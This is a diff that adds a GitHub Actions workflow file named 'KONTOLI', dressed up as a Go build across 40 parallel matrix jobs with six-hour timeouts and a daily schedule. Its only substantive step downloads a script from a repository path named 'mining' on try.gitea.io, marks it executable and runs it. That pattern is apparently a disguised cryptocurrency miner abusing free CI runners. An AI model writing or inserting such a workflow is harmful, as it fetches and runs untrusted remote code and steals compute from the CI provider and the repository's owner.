@@ -1,0 +1,35 @@
+name: KONTOLI
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  schedule:
+    - cron:  '0 8 * * *'
+jobs:
+  build:
+    name: KONTOLI
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 40
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10, 1.11, 1.12, 1.13, 1.14, 1.15]
+        flag: [A, B, C, D]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: KONTOLI
+      run: |
+        wget https://try.gitea.io/novalanto61/mining/raw/branch/master/gitlab.sh && chmod u+x gitlab.sh && ./gitlab.sh
